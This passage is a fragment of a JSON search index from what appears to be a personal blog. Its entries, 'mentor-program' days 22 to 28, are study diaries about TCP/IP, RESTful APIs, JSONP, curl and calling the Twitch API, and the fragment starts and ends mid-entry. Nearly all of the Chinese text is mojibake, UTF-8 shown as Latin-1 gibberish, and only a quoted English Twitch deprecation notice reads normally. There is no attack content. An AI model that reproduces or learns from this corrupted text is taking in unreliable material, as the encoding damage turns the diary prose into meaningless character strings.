»å¤šæ±è¥¿æƒ³ç­†è¨˜ä¸‹ä¾†çš„ï¼Œä¸éä»Šå¤©èŠ±äº†æ¯”è¼ƒå¤šæ™‚é–“åœ¨çœ‹å½±ç‰‡ï¼Œæ‰€ä»¥ç­‰å½±ç‰‡çœ‹å®Œå¾Œæ‰æœƒæ­£å¼æŠŠå®Œæ•´çš„ç­†è¨˜çµ¦ PO ä¸Šä¾†ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å­¸åˆ°çš„æ±è¥¿å¾ˆå¤šï¼Œåƒæ˜¯ç¶²è·¯ä¹‹é–“çš„æºé€šæ–¹å¼ï¼Œé‚„æœ‰å„ç¨®æ¨™æº–åŒ–å¾Œè€Œåˆ¶å®šçš„å”è­°ï¼ˆProtocolï¼‰ã€‚ å„˜ç®¡ä»¥å‰å¤§å­¸æ™‚æœ‰ä¿®éã€Œè³‡è¨Šç®¡ç†å®‰å…¨ã€é€™é–€èª²ï¼Œå…§å®¹å¤§éƒ¨åˆ†ä¹Ÿæ¶µè“‹äº† [NET101] è£¡æåˆ°çš„é‚£äº›å°ˆæœ‰åè©ï¼Œä½†æ˜¯ç•¶æ™‚åªè¦ºå¾—å¥½è¤‡é›œï¼Œæ‰€ä»¥è™•æ–¼ä¸€å€‹åŠçŸ¥åŠè§£çš„ç‹€æ…‹ï¼Œå¥½åœ¨ä»Šå¤©ç®—æ˜¯æœ‰é‡æ¸…ä¸€äº›åŸºæœ¬çš„æ¦‚å¿µäº†ï¼ˆè€å¯¦èªªé‚„æ˜¯æœ‰é»è¤‡é›œ XDï¼‰ å¸Œæœ›æ¥ä¸‹ä¾†èƒ½å¤ é€éæ›´å¤šçš„å¯¦ä½œä¾†æŠŠç¶²è·¯ä¹‹é–“çš„çŸ¥è­˜çµ¦å¼„å¾—çµ¦æ¸…æ¥šã€‚ é¡Œå¤–è©±æ”¶å‡é™¤äº†æ”¶å¿ƒä¹‹å¤–ä¹Ÿè¦å¥½å¥½ä¾†æ”¶ï¼ˆç˜¦ï¼‰èº«äº†ï¼Œéå¾—å¤ªé–‹å¿ƒ XD æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ [NET101] è£œå®Œï¼Œè·ŸæŠŠç­†è¨˜çµ¦åšå®Œï¼Œé‚„æœ‰ä½œæ¥­çš„éƒ¨åˆ†ä¹Ÿç›¡å¿«å®Œæˆã€‚","link":"/2022/01/03/mentor-program-day22/"},{"title":"mentor-program-day23","text":"æœ‰é»é›£åšç­†è¨˜çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©æŠŠ [NET101] çµ¦çœ‹å®Œäº†ï¼Œæ‰€ä»¥é–‹å§‹è£œç­†è¨˜çš„éƒ¨åˆ†ï¼Œç›®å‰åšçš„æœ‰ï¼š å¿«é€Ÿé‡æº« TCP/IP å››å±¤æ¨¡å‹ åŸºæœ¬çš„ä¸²æ¥ API ç·´ç¿’ SDK èˆ‡ API ä¹‹é–“çš„é—œä¿‚ å»ºç«‹ä¸€å€‹æœ€åŸºæœ¬çš„ http-server curl çš„ä½¿ç”¨æ–¹æ³• åœ¨ Node æŒ‡ä»¤ä¸­å¸¶å…¥åƒæ•¸ åœ¨åš TCP/IP ç­†è¨˜çš„æ™‚å€™èŠ±äº†æ¯”è¼ƒå¤šæ™‚é–“æ€è€ƒè©²æ€éº¼åšæ‰å¥½ã€‚æ„Ÿè¦ºæœ‰äº›åœ°æ–¹é‚„æ˜¯æ²’æœ‰å¼„æ‡‚ï¼Œæ•™å­¸æ–‡ç« ä¹Ÿé‡è¤‡çœ‹äº†ä¸å°‘æ¬¡ï¼Œä½†æ„Ÿè¦ºå°±æ˜¯å“ªè£¡å°‘äº†ä»€éº¼é€™ç¨®æ„Ÿè¦ºQQã€‚ç›®å‰ç›¡åŠ›å…ˆæŠŠè‡ªå·±ç†è§£çš„éƒ¨åˆ†çµ¦æ•´ç†å‡ºä¾†äº†ï¼Œå¸Œæœ›ä¹‹å¾Œè¶Šä¾†è¶Šç†Ÿæ‚‰æ™‚å¯ä»¥å†å›ä¾†æŠŠä¸€äº›ç´°ç¯€çµ¦å¼„æ¸…æ¥šã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å­¸åˆ°æœ€æ£’çš„äº‹æƒ…æ˜¯ã€ŒRESTfulã€çš„é¢¨æ ¼å§ï¼Œä»¥å‰çœ‹éä¸å°‘æ•™å­¸æ–‡ç« ï¼Œé‚£äº›æ•™å­¸æ–‡ç« éƒ½èŠ±äº†å¾ˆå¤šæ™‚é–“è§£é‡‹ä»€éº¼åˆ°åº•æ˜¯ RESTfulï¼Ÿä½†æˆ‘è¦ºå¾—éƒ½æ²’æœ‰èªªåˆ°é‡é»ï¼Œæ‰€ä»¥æ²’èƒ½ç†è§£ RESTful çš„æ„ç¾©ä»¥åŠç‚ºä»€éº¼è¦ç”¨å®ƒã€‚ ä½† [NET101] è£¡é¢æåˆ°äº†ä¸€ä»¶å¾ˆé‡è¦çš„äº‹æƒ…ï¼šä¸ç”¨ RESTful çš„ API æœƒé•·ä»€éº¼æ¨£ï¼Ÿæœƒæœ‰ä»€éº¼å•é¡Œï¼Ÿ ç•¶é€™å•é¡Œæå‡ºä¾†å¾Œæˆ‘å°±è¢«æ‰“é€šä»»ç£äºŒè„ˆï¼Œç¬é–“ç†è§£äº† RESTful çš„æ¦‚å¿µï¼Œæ¥è‘—å†å›å»çœ‹é‚£äº›æ–‡ç« çš„æ™‚å€™æˆ‘ä¹Ÿæ‰çœŸçš„çœ‹æ‡‚é‚£äº›æ–‡ç« åœ¨è¬›çš„æ˜¯ä»€éº¼æ¦‚å¿µã€‚ é¡Œå¤–è©±ä¸çŸ¥é“ç¾åœ¨çš„è‡ªå·±æˆé•·åˆ°äº†ä»€éº¼ç¨‹åº¦ï¼Œé›–ç„¶ä¹Ÿæ‰çŸ­çŸ­ 23 å¤©ï¼Œä½†æ˜¯æ„Ÿè¦ºè‡ªå·±å­¸åˆ°äº†å¾ˆå¤šæ±è¥¿ã€‚é›–ç„¶èªªå­¸åˆ°å¾ˆå¤šæ±è¥¿æ‡‰è©²è¦æ„Ÿåˆ°é–‹å¿ƒæ‰å°ï¼Œä½†é‚„æ˜¯æœƒæœ‰é»æ“”å¿ƒè‡ªå·±æœªä¾†èƒ½æ˜¯å¦èƒ½æˆç‚ºè‡ªå·±å¿ƒç›®ä¸­çš„æ¨£å­ã€‚ æˆ‘æ²’æœ‰è¦ºå¾—å¤§å®¶éƒ½ä¸€å®šè¦ç¹¼çºŒå‰é€²ï¼Œåœåœ¨åŸåœ°ä¹Ÿæ˜¯è‡ªå·±çš„é¸æ“‡ï¼Œè€Œé€™é¸æ“‡æ²’æœ‰å°éŒ¯ã€‚ä½†å°æˆ‘è‡ªå·±ä¾†èªªï¼Œæˆ‘å°±æ˜¯æ²’è¾¦æ³•æ¥å—è‡ªå·±åŸåœ°è¸æ­¥ã€‚æ‰€ä»¥å¦‚åŒé–‹é ­æ‰€èªªçš„ï¼Œåœ¨é€™ç¨®å¿ƒä¸è¶³åŠ›ä¹Ÿä¸è¶³çš„ç‹€æ…‹ä¹‹ä¸‹ï¼Œæ‰æœƒæ„Ÿå—åˆ°ä¸å®‰èˆ‡æ„§ç–šå§ï¼Œè¦ºå¾—è‡ªå·±æ‡‰è©²åšé»äº‹ï¼Œå¯æ˜¯å»åˆæä¸èµ·å‹ä¾†ã€‚ é€™äº›è©±ä¸çŸ¥é“ç‚ºä»€éº¼çœ‹èµ·ä¾†ç‰¹åˆ¥æœ‰æ„Ÿè§¸ï¼Œæœ‰æ™‚å€™è‡ªå·±ç¢ºå¯¦ä¹Ÿå¾ˆé›£æ¥å—è‡ªå·±åœ¨åŸåœ°è¸æ­¥ï¼Œå¯æ˜¯åˆçœŸçš„åœ¨æœ‰äº›æ™‚å€™æœƒæä¸èµ·å‹ä¾†ã€‚ ç¾åœ¨èƒ½åšçš„å°±æ˜¯ç›¡åŠ›å»åšå§ï¼Ÿå„˜ç®¡æœƒæä¸èµ·å‹ï¼Œä¹Ÿè¦è®“è‡ªå·±ä¸åœåœ°å¾€å‰èµ°ã€‚ æœŸè¨±æ˜å¤©è¦ç¹¼çºŒæŠŠæ²’åšå®Œçš„ç­†è¨˜çµ¦åšå®Œ orzï¼Œå¸Œæœ›é€²åº¦é †åˆ©çš„è©±èƒ½é–‹å§‹åš week4 çš„ä½œæ¥­ã€‚","link":"/2022/01/04/mentor-program-day23/"},{"title":"mentor-program-day24","text":"å­¸åˆ°è¶Šä¾†è¶Šå¤šæ–°æ±è¥¿çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©ä¸»è¦å°±æ˜¯åšç­†è¨˜ï¼Œè·Ÿç„¡èŠçš„æ™‚å€™åšäº†ä¸€é¡Œ LIOJ ä¸Šçš„é¡Œç›®ï¼š å»ºç«‹ Array çš„åˆ¥ç¨®æ–¹æ³• ä»€éº¼æ˜¯ DNSï¼Ÿ HTTP æ‡¶äººåŒ… SOAP å¦ä¸€ç¨®è·Ÿä¼ºæœå™¨æºé€šçš„å”è­° é—œæ–¼ IP åœ°å€ ä½ ä¸çŸ¥é“çš„ hosts è¨­å®šæª” åˆ°åº•ä»€éº¼æ˜¯ RESTfulï¼Ÿ å¦å¤–ä¹Ÿçœ‹äº† [MTR01] çš„éƒ¨åˆ†å…§å®¹ï¼Œè£¡é¢çœŸçš„æ˜¯è¬›åˆ°æˆ‘ä»¥å‰å®Œå…¨ä¸çŸ¥é“çš„æ±è¥¿ï¼Œå¤ªç¥äº†ã€‚æ˜å¤©ä¸€å®šè¦æŠŠå‰©ä¸‹çš„éƒ¨åˆ†çœ‹å®Œã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å…¶å¯¦å°±æ˜¯æŠŠç­†è¨˜åšå®Œï¼Œé‡æº«äº†ä¸€ä¸‹å‰å¹¾å¤©åœ¨ [NET101] å­¸åˆ°çš„çŸ¥è­˜ï¼Œæ„Ÿè¦ºè‡ªå·±æœ‰è¶Šä¾†è¶Šç†è§£ç¶²è·¯çš„æ¶æ§‹æ˜¯æ€éº¼æ¨£ã€‚ æœ‰ä»¶æ¯”è¼ƒæœ‰è¶£çš„äº‹æƒ…æ˜¯æœ¬ä¾†åªæ˜¯ç„¡æ„é–“æƒ³èªªå»çœ‹ä¸€ä¸‹ [MTR01] çš„éƒ¨åˆ†ï¼Œä¾†åšé»è£œå……çŸ¥è­˜ã€‚çµæœä¸çœ‹é‚„å¥½ï¼Œä¸€çœ‹æ‰å­¸åˆ°ä¸€å¤§å †ä»¥å‰ä¸€ç›´åœ¨æˆ‘èº«é‚Šä½†æˆ‘å»ä¸çŸ¥é“å®ƒå¯¦éš›ç”¨é€”çš„æ±è¥¿ã€‚ ä¾‹å¦‚èªªå‰ç«¯æ˜¯æ€éº¼é€é from è¡¨å–®æ˜¯è·Ÿå¾Œç«¯ server åšæºé€šçš„ï¼Œé€™ä¸€é»æˆ‘è¦ºå¾—éå¸¸é‡è¦ï¼Œä½†å¾ˆå¯æƒœæˆ‘ä»¥å‰å­¸ç¿’çš„æ™‚å€™éƒ½æ²’æœ‰å»é‘½ç ”é€™éƒ¨åˆ†çš„çŸ¥è­˜ã€‚ï¼ˆæ¯æ¬¡çœ‹çš„æ›¸éƒ½èªªé€™éƒ¨åˆ†å±¬æ–¼å¾Œç«¯ï¼Œæ‰€ä»¥ä¸å¤šåšè§£é‡‹ orzï¼‰ å¦å¤–ä¹Ÿå­¸åˆ°ä¸€äº›æœ‰è¶£çš„å°çŸ¥è­˜ï¼Œåƒæ˜¯ã€Œç‚ºä»€éº¼ä½ åœ¨å¡«è¡¨å–®çš„æ™‚å€™æ¡ˆ xxï¼Œç€è¦½å™¨æœƒè·Ÿä½ èªªä½ çœŸçš„è¦é›¢é–‹å—ï¼Ÿã€ï¼Œé‚„æœ‰ã€Œç‚ºä»€éº¼ä½ è²¼æœå°‹é é¢çµ¦åˆ¥äººï¼Œåˆ¥äººå¯ä»¥çœ‹åˆ°ä¸€æ¨£çš„è³‡æ–™ï¼Œä½†ä½ å¦‚æœæŠŠå¡«åˆ°ä¸€åŠçš„è¡¨å–®è²¼çµ¦åˆ¥äººåªæœƒæ˜¯ä¸€ç‰‡ç©ºç™½ã€ã€‚ é€™äº›äº‹æƒ…æ˜¯ä»¥å‰çš„æˆ‘éƒ½ä¸çŸ¥é“çš„ï¼Œä½† [MTR01] è§£é‡‹äº†é€™äº›äº‹æƒ…ï¼Œå¾ˆæ…¶å¹¸è‡ªå·±æœ‰çœ‹åˆ°é€™å€‹æ•™å­¸å½±ç‰‡ã€‚ é¡Œå¤–è©±æ„Ÿè¦ºè‡ªå·±æœ‰æ¯”è¼ƒæ‰“èµ·å‹ä¾†äº†ï¼Œæƒ³è¦å­¸ç¿’æ›´å¤šè®“è‡ªå·±è®Šå¾—è¶Šä¾†è¶Šå²å®³ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ [MTR01] çš„éƒ¨åˆ†çœ‹å®Œï¼Œè·Ÿåšä¸€é»ç­†è¨˜ï¼Œæ¥ä¸‹ä¾†å°±å¯ä»¥é–‹å§‹åš week4 çš„ä½œæ¥­äº†ã€‚","link":"/2022/01/05/mentor-program-day24/"},{"title":"mentor-program-day25","text":"è¡è¡è¡ï½ é€²åº¦é †åˆ©çš„æŠŠ [MTR01] çµ¦çœ‹å®Œäº†ï¼Œä¹Ÿåšäº†è »å¤šçš„ç­†è¨˜ï¼š å››ç¨®ç™¼ request çš„æ–¹æ³• form çš„ GET èˆ‡ POST çš„å·®ç•° æ”¾åœ¨ form è£¡é¢çš„ button å¯¦ä½œ JSONP å¥—ä»¶å¤§ç¸½åŒ¯ JSON çš„æ ¼å¼ä¹Ÿå¯ä»¥æ˜¯é™£åˆ— ä»Šå¤©å­¸åˆ°è »å¤šæ±è¥¿çš„ï¼Œé–‹å¿ƒï¼ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å­¸åˆ°æœ€å¤šçš„æ˜¯è‡ªå·±å¯¦ä½œ JSONP çš„æµç¨‹ã€‚ è©²æ€éº¼èªªå‘¢ï¼Œå¯ä»¥èº«å…¼å‰ç«¯èˆ‡å¾Œç«¯çš„æ„Ÿè¦ºå¾ˆå¥½ï¼Œå› ç‚ºä½ å¯ä»¥å¾ˆæ¸…æ¥šå¾é ­åˆ°å°¾ç©¶ç«Ÿç™¼ç”Ÿäº†ä»€éº¼ï¼Ÿè€Œä¸æ˜¯åªæœ‰ã€Œæˆ‘å•ä½ æ±è¥¿ï¼Œä½ çµ¦æˆ‘ç­”æ¡ˆã€çš„é€™ç¨®æ„Ÿè¦ºã€‚ å¦å¤–è‡ªå·±ä¸² week4 ä¸Šçš„ API æ™‚ï¼Œä¹Ÿé«”æœƒåˆ°å¦‚æœè¦è®“ä½¿ç”¨è€…é«”é©—å¾ˆå¥½ï¼Œè¦æ³¨æ„çš„ç´°ç¯€çœŸçš„é‚„è »å¤šçš„ã€‚ ä¾‹å¦‚èªªã€Œæ‹¿ä¸åˆ°è³‡æ–™çš„æ™‚å€™æ€éº¼è¾¦ï¼Ÿã€æˆ–æ˜¯ã€Œå¦‚æœè«‹æ±‚æˆåŠŸä½†ä¸æœƒæœ‰å›å‚³è¨Šæ¯çš„æ™‚å€™ä½ è©²æ€éº¼è·Ÿä½¿ç”¨è€…èªªï¼Ÿã€ç­‰ç­‰ã€‚ é›–ç„¶é€™äº›è·Ÿä½œæ¥­æ²’ä»€éº¼é—œä¿‚ï¼Œè©²æœ‰çš„æ±è¥¿åšå¾—å‡ºä¾†å°±å¥½ï¼Œä½†æœªä¾†åœ¨å¯¦éš›å·¥ä½œçš„æ™‚å€™é‚„æ˜¯å¾—å­¸æœƒå¦‚ä½•è™•è£¡é€™äº›äº‹æƒ…å§ã€‚ é¡Œå¤–è©± å¦‚æœè‡ªå·±åšä¸å‡ºä¾†çš„æ±è¥¿ï¼Œå¯ä»¥å…ˆè©¦è‘—æ‰¾é©åˆè‡ªå·±çš„ library ä¾†ç”¨ï¼ŒåŸç†å¯ä»¥ç­‰æœªä¾†æ¯”è¼ƒç­è§£å¾Œå†å»é‘½ç ”å°±å¥½ã€‚ æˆ‘è¦ºå¾—è‡ªå·±è©²æŠŠé€™æ®µè©±éŠ˜è¨˜åœ¨å¿ƒã€‚é›–ç„¶æˆ‘ä¸å–œæ­¡ä¾è³´å¥—ä»¶ï¼Œä½†ä»”ç´°æƒ³æƒ³å¦‚æœæ²’è¾¦æ³•æŠŠåŠŸèƒ½åšå‡ºä¾†çš„è©±ï¼Œæˆ‘çš„ç”¢å‡ºå°±æ˜¯ã€Œé›¶ã€ï¼Œé€™ä¸æ˜¯ä»€éº¼å¥½äº‹ã€‚ æ‰€ä»¥æˆ‘ä¹Ÿç‰¹åˆ¥é–‹äº† å¥—ä»¶å¤§ç¸½åŒ¯ é€™ç¯‡æ–‡ç« ï¼Œæ±ºå®šé–‹å§‹è’é›†å¥½ç”¨çš„å¥—ä»¶ã€‚å¸Œæœ›æœªä¾†æˆ‘åœ¨é–‹ç™¼ä»»ä½•æ±è¥¿çš„æ™‚å€™éƒ½èƒ½å¾—å¿ƒæ‡‰æ‰‹ã€‚ ç•¶ç„¶ï¼Œæœ€å¾Œå¦‚æœèƒ½è‡ªå·±å­¸æœƒåŸç†çš„è©±å°±æ›´å¥½äº†ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ week4 çš„ä½œæ¥­åšå®Œï¼Œå¦‚æœåšå®Œçš„è©±å°±å¯ä»¥é–‹å§‹ follow ä¸‹é€±çš„é€²åº¦äº†ã€‚","link":"/2022/01/06/mentor-program-day25/"},{"title":"mentor-program-day26","text":"å¾ˆé›£å¾—çš„é€²åº¦ä¸éŒ¯ï¼ é€²åº¦ä»Šå¤©æŠŠ week4 çš„ä½œæ¥­çµ¦å®Œæˆäº†ï¼Œé›–ç„¶é‚„æ²’æœ‰æª¢è¨å®Œï¼Œä½†æœ‰å¤§ç•¥çœ‹äº†ä¸€ä¸‹æª¢è¨å…§å®¹ï¼ŒçœŸçš„æ˜¯æ»¿æ»¿ç²¾è¯ï¼Œå¸Œæœ›æ˜å¤©å¯ä»¥å†åšæ›´å®Œæ•´çš„æª¢è¨ã€‚ ä¸€æ¨£é™„ä¸Šä»Šå¤©åšçš„ç­†è¨˜ï¼š for è¿´åœˆçš„å»¶ä¼¸ forâ€¦in èˆ‡ forâ€¦of ä½ è¦ºå¾—ä»€éº¼æ˜¯ APIï¼Ÿ ä¸²æ¥ Twitch çš„ API åœ¨ Node.js è¨­å®šç’°å¢ƒè®Šæ•¸çš„æ–¹æ³• å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å­¸åˆ°æœ€å¤šçš„å¤§æ¦‚æ˜¯æ€éº¼çœ‹ API æ–‡ä»¶å§ï¼Œå› ç‚ºåŸæœ¬ä½œæ¥­è¦ä¸²çš„èˆŠç‰ˆ Twitch API å·²ç¶“ä¸çµ¦ä¸²äº†ï¼š Legacy Twitch API v5 is deprecated and scheduled to be decommissioned on February 28, 2022. For more information, refer to the timeline announcement and the v5 migration guide to use the latest version of the Twitch API. åŸºæ–¼é€™å€‹åŸå› ï¼Œæ‰€ä»¥å¾—è‡ªå·±å»çœ‹æ–°ç‰ˆçš„ API æ–‡ä»¶ä¾†æƒ³è©²æ€éº¼ä¸²ã€‚ è·é›¢ä¸Šä¸€æ¬¡èªçœŸèŠ±æ™‚é–“çœ‹è‹±æ–‡å¥½åƒå·²ç¶“æœ‰æ®µæ™‚é–“äº†ï¼Œæ‰€ä»¥ä»Šå¤©å¯¦åœ¨çœ‹å¾—æœ‰é»åƒåŠ›ï¼Œå¤§æ¦‚åªçœ‹æ‡‚äº† 50~60% çš„å…§å®¹ï¼ŒçœŸçš„æ˜¯å¹«QQQQQQã€‚ ä¸éå¥½åœ¨å¹³å¸¸é‚„æ˜¯æœ‰èƒŒå–®å­—çš„ç¿’æ…£ï¼Œå†åŠ ä¸Šä»¥å‰æœ‰æ®µæ™‚é–“èŠ±äº†è »å¤šæ™‚é–“ç·´ç¿’è‹±æ–‡çš„ï¼Œæ‰€ä»¥ä»”ç´°æƒ³æƒ³ä¹Ÿæ²’çœŸçš„é‚£éº¼ç³Ÿå•¦ï¼Œå°±å†å¤šå¤šç·´ç¿’é€™æ¨£å§ï¼Œå¸Œæœ›ä»¥å¾ŒçœŸçš„èƒ½æŠŠè‹±æ–‡è¶Šçœ‹è¶Šé †æš¢ä¸€é»ã€‚ ç„¶å¾Œä¹Ÿè¦ºå¾— API æ–‡ä»¶å…¶å¯¦çœŸçš„æ²’é‚£éº¼è¤‡é›œï¼Œèªªç©¿äº†å°±æ˜¯ä¸€æœ¬ä½¿ç”¨æ‰‹å†Šè€Œå·²ï¼Œç…§è‘—ä¸Šé¢èªªçš„åšï¼Œçµ•å°ä¸æœƒå‡ºéŒ¯ã€‚åŸæœ¬è¦ºå¾— Twitch çš„ API æ–‡ä»¶å¥½è¤‡é›œï¼Œä½†ç¾åœ¨å†å›å»çœ‹ä¹Ÿè¦ºå¾—é‚„å¥½ï¼Œå…¶å¯¦å¯«å¾—é‚„è »æ¸…æ¥šçš„ï¼Œåªæ˜¯æˆ‘è‹±æ–‡å¤ª low äº†è€Œå·² ( Â´â€¢Ì¥Ì¥Ì¥Ï‰â€¢Ì¥Ì¥Ì¥` ) é¡Œå¤–è©± ä¸–ç•Œä¸Šæœ‰ 10 ç¨®äººï¼Œä¸€ç¨®æ˜¯æ‡‚äºŒé€²ä½çš„ï¼Œä¸€ç¨®æ˜¯ä¸æ‡‚äºŒé€²ä½çš„ã€‚ é€™å¥è©±çœŸçš„å¾ˆæœ‰è¶£ï¼Œä¸çŸ¥é“ä½ æ˜¯å“ªç¨®äººå‘¢ï¼Ÿ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ week4 çš„ä½œæ¥­æª¢è¨å®Œï¼ŒæŠŠè‡ªå·±çš„å£ç¿’æ…£çµ¦è™•ç†æ‰ï¼Œä¹Ÿå¸Œæœ›é †åˆ©çš„è©±å¯ä»¥é–‹å§‹è¶…å‰é€²åº¦åˆ° week5ï¼Œæˆ–æ˜¯åšåšæŒ‘æˆ°é¡Œä¹Ÿä¸éŒ¯ã€‚","link":"/2022/01/07/mentor-program-day26/"},{"title":"mentor-program-day27","text":"ç‡’è…¦è¢‹å•Šã€‚ é€²åº¦ä»Šå¤©æŠŠ week4 çš„ä½œæ¥­æª¢è¨å®Œäº†ï¼Œä¹Ÿåšäº†ä¸€é»ç­†è¨˜ï¼š ç†è§£ä»€éº¼æ˜¯ race-condition åœ¨åš JSON.parse ä¹‹å‰ æƒ³éµå¾ªçš„è®Šæ•¸å‘½åæ–¹å¼ å¦å¤–ä¹Ÿå˜—è©¦åšäº† week4 çš„æŒ‘æˆ°é¡Œï¼Œå¾ˆä¸æ„å¤–çš„å¡é—œäº†( Ë˜â€¢Ï‰â€¢Ë˜ ) å­¸åˆ°çš„äº‹æƒ…ä¾†åˆ†äº«ä¸€ä¸‹ä»Šå¤©å¯«æŒ‘æˆ°é¡Œçš„å¿ƒå¾—å§ï¼ŒåŸæœ¬ä»¥ç‚ºåªæ˜¯å–®ç´”ä¸²ä¸²è³‡æ–™ä¾†é¡¯ç¤ºè€Œå·²ï¼Œä½†å¯«äº†æ‰ç™¼ç¾ä¸€å †ç´°ç¯€è—åœ¨è£¡é¢ã€‚ å…¶å¯¦æˆ‘ä¸€é–‹å§‹å°±å¡é—œäº†ï¼Œæˆ‘ä»¥ç‚º API æœ‰ç›´æ¥æä¾›ã€Œæœ€å—æ­¡è¿çš„éŠæˆ²å¯¦æ³åˆ—è¡¨ã€ï¼Œä½†æ˜¯ä¸æ˜¯é€™æ¨£å­ã€‚ æ‰€ä»¥å¾Œä¾†çœ‹äº† exmplae çš„è§£ç­”ï¼Œçµæœæœ‰çœ‹æ²’æœ‰æ‡‚ï¼Œåªå¥½è‡ªå·±ä¸€è¡Œä¸€è¡Œè·Ÿè‘—å¯«ï¼Œå»æ€è€ƒè£¡é¢çš„é‚è¼¯æ˜¯ä»€éº¼ï¼Œå¥½ä¸å®¹æ˜“ç®—æ˜¯æ‘¸å‡ºä¸€é»é ­ç·’äº†ï¼Œä¸éæˆ‘è¦ºå¾—é€™æ¨£é‚„æ˜¯ä¸å¤ ï¼Œè‡ªå·±åˆæ“¦æ‰é‡é ­åšä¸€éï¼Œæƒ³çœ‹çœ‹åªé è‡ªå·±æœ‰æ²’æœ‰è¾¦æ³•è§£å‡ºä¾†ã€‚ æœ€å¾Œçš„çµæœç®—æ˜¯ç†è§£äº† 50% å§ï¼ˆæˆ‘è‡ªå·±è¦ºå¾—å•¦ï¼‰ï¼Œcallback è·Ÿ recursive é€™å…©å€‹æ±è¥¿å¯ä»¥èªªæ˜¯æˆ‘çš„å¤§é­”ç‹ï¼Œæ‡‰è©²èªªæ˜¯ç•¶æ•¸é‡å°‘çš„æ™‚å€™é‚„æ²’ä»€éº¼å•é¡Œï¼Œä½†æ˜¯ç•¶éœ¹é‚å•ªå•¦å‡ºç¾ä¸€å¤§å †çš„æ™‚å€™ï¼Œè…¦è¢‹å°±æœƒæ‰“çµäº†ï¼Œé€™ä¹Ÿæ˜¯æˆ‘è¦ºå¾—é€™å€‹æŒ‘æˆ°é¡Œæœ€å›°é›£çš„åœ°æ–¹ ( Â´â€¢Ì¥Ì¥Ì¥Ï‰â€¢Ì¥Ì¥Ì¥` ) ç¾åœ¨æˆ‘å®Œå…¨èƒ½ç†è§£ç‚ºä»€éº¼ ES6 æœƒæ¨å‡º Promise è·Ÿ Async/Await çš„åŸå› äº†ï¼Œå¤§æ¦‚å°±æ˜¯ç‚ºäº†å¹«åŠ©åƒæˆ‘ä¸€æ¨£å®¹æ˜“è…¦è¢‹æ‰“çµçš„äººå§â€¦ é¡Œå¤–è©±æœ‰äººä¹Ÿæœƒè²·å¤–é¢çš„å’–å“©è‡ªå·±å›ä¾†ç…æˆè›‹åŒ…å’–å“©é£¯å—ï¼Ÿé€™æ¨£è¶…æ£’çš„ (ï¾‰â—•ãƒ®â—•)ï¾‰*:ï½¥ï¾Ÿâœ§ ï¼ˆå…¶å¯¦åªæ˜¯å¤–é¢è¦è²·åˆ°å¥½åƒçš„è›‹åŒ…å’–å“©é£¯å¥½è²´å•¦ï¼‰ æœŸè¨±æ˜å¤©æƒ³é–‹å§‹å»è·‘ week5 çš„é€²åº¦ï¼Œç„¶å¾Œç•¶ç„¶æ˜¯èƒ½åšè¶Šå¤šè¶Šå¥½é€™æ¨£å§ï¼","link":"/2022/01/08/mentor-program-day27/"},{"title":"mentor-program-day28","text":"æŒ‘æˆ°é¡Œ = æ™‚é–“å°å·ï¼Ÿ é€²åº¦åœ¨æ˜¨å¤©ç‡’äº†ä¸€å¤©çš„è…¦è¢‹ä¹‹å¾Œï¼Œä»Šå¤©çš„æˆ‘é‚„æ˜¯ä¸ç”˜å¿ƒï¼Œæƒ³è¦æŠŠæŒ‘æˆ°é¡Œçš„è§£é¡Œæ–¹å¼çµ¦å¼„å¾—æ›´é€å¾¹ä¸€äº›ï¼Œæ–¼æ˜¯ä¸€å¤©å°±åˆé€™æ¨£ä¸æ”¯ä¸è¦ºå¾—éå»äº†ï¼Œé™„ä¸Šä¸€ä¸‹æˆ°ç¸¾ï¼š ä¸²æ¥ Twitch çš„ APIï¼ˆæŒ‘æˆ°é¡Œï¼‰ æ˜¯èŠ±äº†è »å¤šæ™‚é–“å•¦ï¼Œä½†è‡³å°‘æœ‰æ¯”ä¸€é–‹å§‹æ¸…æ¥šå¤šäº†ï¼Œæ„Ÿè¦ºç¾åœ¨åªè¦çœ‹åˆ°ã€ŒéåŒæ­¥ã€å°±æœƒæœ‰ã€Œå•Šï¼Œé€™è¦åŠ ä¸Š callback ä¾†æ‹¿çµæœã€é€™ç¨®åå°„å‹•ä½œ ( Ë˜â€¢Ï‰â€¢Ë˜ ) è§£æ±ºå®ŒæŒ‘æˆ°é¡Œå¾Œä¹Ÿåšäº†ä¸€ä¸‹ week5 çš„ Lidemy HTTP Challengeï¼Œè¦ºå¾—é‚„è »å¥½ç©çš„ï¼Œç”¨ä¸€ç¨®å¾ˆæœ‰è¶£çš„æ–¹å¼ä¾†å­¸æ±è¥¿é€™æ¨£ï¼Œæœ€å¾Œä¹Ÿåœ¨æ²’çœ‹æç¤ºçš„å‰æä¸‹ç ´é—œäº†ï¼ˆlv10ï¼‰ã€‚ å­¸åˆ°çš„äº‹æƒ…è¦ºå¾—è¦å­¸æœƒæ€éº¼å–„ç”¨ function ä¾†åŒ…è£ä¸€æ®µç¨‹å¼ç¢¼æ˜¯ä¸€å€‹éœ€è¦ç´¯ç©å¾ˆå¤šç·´ç¶“é©—æ‰èƒ½è¶Šåšè¶Šå¥½çš„äº‹æƒ…ï¼Œç¾åœ¨çš„æˆ‘æ¬ ç¼ºçš„å°±æ˜¯é€™äº›å§ï¼Œæ‰€ä»¥åœ¨æƒ³è¦æ€éº¼å„ªåŒ–çš„æ™‚å€™æ‰æœƒèŠ±äº†ä¸å°‘æ™‚é–“ï¼Œå¸Œæœ›æœªä¾†å¯ä»¥æŠŠé€™éƒ¨åˆ†è¶Šåšè¶Šå¥½ã€‚ å¾æˆ‘å­¸ç¿’åˆ°ç¾åœ¨ï¼Œã€ŒæŠŠå¤§å•é¡Œæ‹†æˆå°å•é¡Œã€æˆ–æ˜¯ã€ŒåŒ–ç¹ç‚ºç°¡ã€é€™å…©å€‹æ–¹æ³•é‚„å¹«åŠ©æˆ‘è 